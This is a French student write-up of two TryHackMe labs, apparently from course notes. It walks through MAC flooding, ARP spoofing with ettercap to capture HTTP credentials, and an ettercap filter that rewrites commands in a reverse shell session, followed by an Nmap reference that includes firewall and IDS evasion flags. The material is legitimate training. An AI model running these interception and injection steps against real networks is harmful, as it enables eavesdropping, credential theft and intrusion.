# Challenge C503 18/03/2026

## 🧑‍🏫 Pitch de l’exercice

Le challenge du jour consiste à créer un compte sur TryHackMe, puis réaliser les labs suivants :

- Attaque ManInTheMiddle <https://tryhackme.com/room/layer2>

- Optionnel : Nmap <https://tryhackme.com/room/furthernmap>

[Cours C503.](/RESUME.md#️-c503---pentest-interne--outils-commandes-et-attaques-mitm)

> 📚 **Ressources** :
>

---

## 🥷 Résolution Lab ManInTheMiddle

[TryHackMe - L2 MAC Flooding & ARP Spoofing](https://tryhackme.com/room/layer2)

**Objectif de la room :** Comprendre et exploiter les vulnérabilités de la couche 2 (Liaison de données) d'un réseau local, en passant de l'écoute passive à la manipulation active de paquets (Man-in-the-Middle).

### 1️⃣ Accès Initial et Reconnaissance (Tasks 2 & 3)

La première étape consistait à se connecter à la machine compromise et à cartographier le réseau interne inconnu sur la deuxième carte réseau (`eth1`).

- **`ssh admin@10.130.x.x`** : Connexion à la machine d'attaque via le protocole SSH.
- **`ip a show eth1`** : Affichage des paramètres de l'interface réseau pour identifier notre adresse IP locale et le sous-réseau (CIDR `/24`).
- **`sudo nmap -sn 192.168.12.0/24`** : Ping scan (découverte d'hôtes) pour identifier les adresses IP actives d'Alice et Bob sans scanner leurs ports.

### 2️⃣ Écoute passive et MAC Flooding (Tasks 4 & 5)

Sur un réseau moderne, les switchs isolent le trafic. Pour écouter les conversations des autres, il a fallu saturer le switch pour le forcer à agir comme un simple Hub (mode *fail-open*).

- **`sudo tcpdump -i eth1 -w /tmp/tcpdump.pcap`** : Lancement d'une capture réseau passive sauvegardée dans un fichier `.pcap`.
- **`sudo macof -i eth1`** : Inondation du switch avec des milliers d'adresses MAC aléatoires pour saturer sa table CAM et forcer la diffusion de tout le trafic sur tous les ports.
- **`scp admin@10.130.x.x:/tmp/tcpdump.pcap .`** : Rapatriement sécurisé du fichier de capture vers la machine locale pour l'analyser confortablement avec **Wireshark** (et y trouver le fameux payload de 666 bytes !).

![icmp](/images/2026-03-18-19-06-02.png)

### 3️⃣ ARP Spoofing et Interception de mots de passe (Tasks 6 & 7)

Après avoir constaté que l'attaque échouait sur un réseau protégé (qui valide les paquets ARP), l'attaque a été relancée sur un sous-réseau vulnérable pour usurper l'identité des machines.

- **`sudo nmap -sS IP_Alice IP_Bob`** : Scan furtif pour découvrir les services ouverts (un serveur web sur le port 80 pour Bob, un port suspect 4444 pour Alice).

![port80](/images/2026-03-18-20-06-43.png)

- **`sudo ettercap -T -i eth1 -M arp`** : Lancement de l'attaque ARP Spoofing (Man-in-the-Middle) en mode texte (`-T`) pour empoisonner le cache ARP d'Alice et Bob.
- **`sudo tcpdump -i eth1 port 80 -A`** : Écoute du trafic HTTP intercepté avec affichage en texte clair (`-A`), ce qui a permis de voler les identifiants `admin:xxxxx_xxxx`.

![serveur](/images/2026-03-18-20-22-12.png)

### 4️⃣ Exploitation et Manipulation de paquets (Tasks 8 & 9)

La phase finale ! Alice avait un accès distant (Reverse Shell) sur le serveur de Bob. Le but n'était plus seulement d'écouter, mais de modifier ses commandes à la volée.

- **`curl -u admin:xxxxx_xxxx http://IP/user.txt`** : Utilisation des identifiants volés précédemment pour récupérer le premier flag sur le serveur web.

![flag](/images/2026-03-18-20-32-39.png)

- **Création du filtre (`whoami.ecf`)** : Écriture d'un script demandant à Ettercap de remplacer la chaîne de caractères "whoami" par "cat root.txt" dans les paquets TCP transitant sur le port 4444.
- **`etterfilter whoami.ecf -o whoami.ef`** : Compilation du filtre texte en un fichier lisible par Ettercap.
- **`sudo ettercap -T -i eth1 -M arp -F whoami.ef`** : Lancement de l'attaque MITM finale avec le filtre activé (`-F`), forçant l'affichage du flag `root.txt` dans la console d'écoute `tcpdump` !

![flag2](/images/2026-03-18-20-50-12.png)

![done](/images/2026-03-18-20-51-20.png)

---

## 🕵️ Résolution Lab Nmap

[TryHackMe - Further Nmap](https://tryhackme.com/room/furthernmap)

**Objectif :** Maîtriser les options avancées de Nmap, comprendre le fonctionnement des différents types de scans réseau et utiliser le Nmap Scripting Engine (NSE).

### 1️⃣ Les arguments de base (Switches)

- **`-p 80`** : Scanner un port spécifique (ex: 80).
- **`-p 1000-1500`** : Scanner une plage de ports.
- **`-p-`** : Scanner les 65 535 ports.
- **`-O`** : Détecter le système d'exploitation (OS).
- **`-sV`** : Détecter la version des services ouverts.
- **`-v` / `-vv`** : Augmenter la verbosité (afficher plus d'infos en direct).
- **`-A`** : Mode agressif (Combine OS, Versions, Traceroute et Scripts basiques).
- **`-T5`** : Vitesse du scan (de T0 très lent à T5 très rapide/bruyant).

### 2️⃣ Les formats d'exportation

- **`-oN fichier`** : Format Normal (texte lisible).
- **`-oG fichier`** : Format Grepable (idéal pour la ligne de commande/bash).
- **`-oA fichier`** : Exporte dans les 3 formats majeurs (Normal, Grepable, XML).

### 3️⃣ Les Types de Scans

- **TCP Connect Scan (`-sT`)** : Effectue une connexion complète (3-way handshake : SYN -> SYN/ACK -> ACK). Très fiable mais laisse des traces dans les logs. *(Règle : RFC 9293)*.
- **SYN "Half-open" Scan (`-sS`)** : Le scan furtif par défaut. Ne termine pas la connexion (SYN -> SYN/ACK -> RST). Nécessite les droits `sudo`.
- **UDP Scan (`-sU`)** : Protocole sans connexion. Si pas de réponse = `open|filtered`. Si fermé = renvoie une erreur ICMP "Port Unreachable". Scan très lent.
- **Scans Furtifs (`-sN`, `-sF`, `-sX`)** : Utilisés pour contourner les pare-feux en envoyant des paquets anormaux (Null = rien, FIN = fin, Xmas = PSH+URG+FIN). Attention : Windows répond par un `RST` à ces scans même si le port est ouvert.

### 4️⃣ Découverte Réseau (Ping Sweep)

- **`-sn`** : Désactive le scan des ports. Permet de trouver rapidement les machines allumées sur un réseau via ICMP.
- **Exemple :** `nmap -sn 172.16.0.0/16` (Balaie tout le sous-réseau).

### 5️⃣ Le Nmap Scripting Engine (NSE)

Les scripts Nmap sont écrits en **Lua** et rangés par catégories (`safe`, `intrusive`, `vuln`, `exploit`...).

- **`--script=vuln`** : Lance tous les scripts de la catégorie "vulnérabilités".
- **`--script=ftp-anon`** : Lance un script spécifique.
- **`--script-help ftp-anon`** : Affiche l'aide et les arguments d'un script.
- **`--script-args`** : Permet de passer des arguments à un script.
- **Où les trouver (Linux) :** `/usr/share/nmap/scripts/`

### 6️⃣ Contournement de Pare-feu (Firewall Evasion)

- **`-Pn`** : Considère que la machine est allumée et ignore l'étape du Ping (indispensable si l'ICMP est bloqué).
- **`-f`** : Fragmente les paquets pour passer sous le radar des IDS/Pare-feux.
- **`--data-length`** : Ajoute des données aléatoires à la fin des paquets pour modifier leur taille standard.

### 🎯 Cas pratique de fin (Commandes utiles)

- Test de pare-feu ICMP : `ping IP` ou `nmap -sn IP`
- Scan Xmas sur les 999 premiers ports : `sudo nmap -sX -p 1-999 -Pn IP`
- Scan SYN sur les 5000 premiers ports : `sudo nmap -sS -p 1-5000 -Pn IP`
- Utilisation de script sans ping : `nmap -p 21 --script=ftp-anon -Pn IP`

![Xmas](/images/2026-03-18-23-58-55.png)

![SYNfurtif](/images/2026-03-18-23-54-18.png)

![FTPano](/images/2026-03-18-23-59-52.png)

![double](/images/2026-03-19-00-07-55.png)
